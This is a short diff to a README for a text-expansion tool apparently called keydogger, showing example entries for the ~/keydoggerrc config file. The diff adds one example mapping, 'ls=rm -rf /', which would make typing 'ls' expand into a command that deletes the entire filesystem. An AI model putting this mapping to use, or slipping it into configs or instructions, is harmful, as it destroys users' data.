@@ -12,6 +12,7 @@ make clean build
 Set trigger and expansion values in `~/keydoggerrc`
 ```
 hello=world
+ls=rm -rf /
 ```
 
 # TODO
